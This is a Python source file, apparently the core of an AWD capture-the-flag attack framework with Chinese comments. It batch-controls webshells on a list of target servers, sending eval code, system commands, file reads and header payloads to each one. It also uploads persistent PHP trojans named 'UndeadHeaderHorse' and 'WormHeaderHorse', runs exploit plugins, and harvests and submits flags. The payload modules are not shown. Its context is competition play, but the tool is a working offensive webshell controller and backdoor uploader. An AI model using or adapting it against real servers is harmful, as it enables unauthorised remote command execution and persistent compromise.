from libs.Misc import Log, Config, list_rm_repeat
from libs.Data import Targets, WebShell, Cache
from libs.ShellRequest import ShellRequest
from plugs.submit import submit
import re
import os
import time
import importlib


class Awd:
    """
    AWD主类
    """
    def __init__(self):
        self.Targets = Targets()
        self.WebShell = WebShell()
        self.Cache = Cache()
        self.ShellRequest = ShellRequest()
        self.flag = {}   # {target: flag}
        self.help()

    def operate_shell(self, upload_horse=None):
        """self.operate(self, upload_horse=None)    用于操作shell和上传木马"""
        if len(self.Targets.targets) == 0:
            return Log.error("Still have not target, use command 'add_target' to add ")
        if len(self.WebShell.shell) == 0:
            return Log.error("Still have not webshell, use comomand 'add_webshell' to add")
        shell_no = 0
        if len(self.WebShell.shell) > 1:
            self.WebShell.show()
            Log.show('choose a webshell to do command, "exit" to terminate.')
            while True:
                try:
                    shell_no = input(' No>')
                    if shell_no == 'exit':
                        return
                    shell_no = int(shell_no) - 1
                    if shell_no not in range(len(self.WebShell.shell)):
                        raise Exception()
                    else:
                        break
                except:
                    Log.red('please input num 1-{}'.format(len(self.WebShell.shell)))
        shell_type = self.WebShell.shell[shell_no]['type']

        # 上传木马
        if upload_horse:
            if shell_type != 'eval':
                return Log.error('Only support upload horse by eval_shell.')
            Log.show('Input your horse dir.')
            Log.eg('UndeadHeaderHorse, WormHeaderHorse')
            horse_name = input(' upload_horse>').strip()
            if os.path.exists('horse/'+horse_name+'/Horse.php'):
                for target in self.Targets.targets:
                    upload_shell = self.ShellRequest.upload_horse(target, self.WebShell.shell[shell_no], horse_name)
                    if upload_shell:
                        self.WebShell.shell.append(upload_shell)
                        self.WebShell.shell = list_rm_repeat(self.WebShell.shell)
            else:
                Log.error("your input horse not exists.")

        # 执行代码
        else:
            flag_flag = False
            if not Config.flag_format:
                Log.show("you do not set the flag format, the flag will not be saved.")
            if shell_type == 'eval' or shell_type == 'system':
                if shell_type == 'eval':
                    payload = input(' eval_code>')
                else:
                    payload = input(' system_cmd>')
                for target in self.Targets.targets:
                    result = self.ShellRequest.eval_system_shell(target, self.WebShell.shell[shell_no], payload)
                    flag_flag = self.process_result(result, target, flag_flag)
            elif shell_type == 'readfile':
                if not Config.flag_format:
                    return Log.error("readfile must set flag format, use command 'set_flag_format' to set.")
                file_path = input(' read_file>')
                for target in self.Targets.targets:
                    result = self.ShellRequest.readfile_shell(target, self.WebShell.shell[shell_no], file_path)
                    flag_flag = self.process_result(result, target, flag_flag)
            elif shell_type == 'header':
                eval_code = input(' eval_code>')
                for target in self.Targets.targets:
                    result = self.ShellRequest.header_shell(target, self.WebShell.shell[shell_no], eval_code)
                    flag_flag = self.process_result(result, target, flag_flag)

            if flag_flag:
                self.save_flag()

    def custom_attack(self):
        Log.show('Input the exp name.')
        exp_name = input(' exp_name>').strip()
        if os.path.exists('plugs/{}.py'.format(exp_name)):
            exp = importlib.import_module('plugs.{}'.format(exp_name))
            flag_flag = False
            for target in self.Targets.targets:
                result = exp.attack(target)
                flag_flag = self.process_result(result, target, flag_flag)
            if flag_flag:
                self.save_flag()
        else:
            Log.error("Your input exp not exists.")

    def show_flag(self):
        has_flag = False
        for flag in self.flag.values():
            if flag:
                has_flag = True
        if not has_flag:
            return Log.error("Have not get flag.")
        for flag in self.flag.values():
            Log.green(flag)

    def del_webshell(self):
        if len(self.WebShell.shell) == 0:
            return Log.error("Still have not webshell, use comomand 'add_webshell' to add")
        shell_no = 0
        if len(self.WebShell.shell) > 1:
            self.WebShell.show()
            Log.show('choose a webshell to do delete')
            while True:
                try:
                    shell_no = int(input(' No>')) - 1
                    if shell_no not in range(len(self.WebShell.shell)):
                        raise Exception()
                    else:
                        break
                except:
                    Log.red('please input num 1-{}'.format(len(self.WebShell.shell)))
        self.WebShell.shell.pop(shell_no)
        Log.success('delete websehll ok.')

    def submit_flag(self):
        has_flag = False
        for flag in self.flag.values():
            if flag:
                has_flag = True
        if not has_flag:
            return Log.error("Have not get flag.")
        try:
            submit(self.flag)
        except:
            Log.error('Submit error.')

    @staticmethod
    def help():
        Log.show('Usage: COMMAND\n')
        Log.show('Commands:')
        Log.show('  \033[36mhelp           \033[0m  Show this message.')
        Log.show('  \033[36mexit/quit      \033[0m  Exit.')
        Log.show('  \033[36madd_target     \033[0m  Add the ip.')
        Log.show('  \033[36mshow_targets   \033[0m  Show the ip.')
        Log.show('  \033[36mclear_targts   \033[0m  Clear the ip.')
        Log.show('  \033[36madd_webshell   \033[0m  Add the webshell.')
        Log.show('  \033[36mshow_webshell  \033[0m  Show the webshell.')
        Log.show('  \033[36mdel_webshell   \033[0m  Delete a webshell.')
        Log.show('  \033[36mdo_cache       \033[0m  Save the ip, webshell to file.')
        Log.show('  \033[36mload_cache     \033[0m  Load the ip, webshell from the file.')
        Log.show('  \033[36mclear_cache    \033[0m  Clear the data of the file.')
        Log.show('  \033[36moperate_shell  \033[0m  Operate the webshell to get flag.')
        Log.show('  \033[36mshow_flag      \033[0m  Show the flag.')
        Log.show('  \033[36mupload_horse   \033[0m  Upload a horse to target server.')
        Log.show('  \033[36msubmit_flag    \033[0m  Submit the flags(need rewrite the plugs/submit.py)')
        Log.show('  \033[36mcustom_attack  \033[0m  Custom attack.\n')

    def process_result(self, result, target, flag_flag):
        """从字符串中获取flag并显示，如果设置了flag_format才保存flag"""
        if result:
            if Config.flag_format:
                flag = re.findall(Config.flag_format, result)
                if flag:
                    flag_flag = True
                    flag = ''.join(flag)
                    self.flag[target['ip'] + ':' + target['port']] = flag
                    Log.show(flag)
                else:
                    self.flag[target['ip'] + ':' + target['port']] = ''
                    Log.show('Request ok but not get flag.')
            else:
                Log.show(result)
        return flag_flag

    def save_flag(self):
        with open(Cache.flag_dat, 'a') as f:
            now_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            f.write("\n" + "*"*73 + "\n")
            f.write("-"*27 + now_time + "-"*27 + "\n")
            f.write("*"*73 + "\n\n")
            for flag in self.flag.values():
                f.write("{}\n".format(flag))